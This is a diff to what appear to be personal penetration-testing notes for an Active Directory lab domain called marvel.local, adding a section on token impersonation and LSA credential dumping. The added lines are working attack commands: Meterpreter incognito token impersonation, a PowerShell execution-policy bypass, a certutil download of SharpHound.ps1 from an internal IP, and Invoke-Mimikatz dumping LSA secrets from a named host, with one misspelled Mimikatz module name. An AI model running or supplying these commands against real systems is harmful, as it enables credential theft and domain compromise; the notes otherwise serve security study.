@@ -60,4 +60,21 @@ long sentences
 privilege access management
 rotate passwords
 
-Token impersonation
+TOKEN IMPERSONATION
+
+meterpreter> load incognito
+impersonate_token marvel\\fcastle
+whoami
+
+also, LSA dump
+powershell -ep bypass
+certutil -urlcache -f http://192.168.0.27/SharpHound.ps1 SharpHound.ps1
+. .\SharpHound.ps1
+
+Invoke-Mimikatz -Command '"priviliege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local
+
+meterpreter > list_tokens -u
+
+
+
+
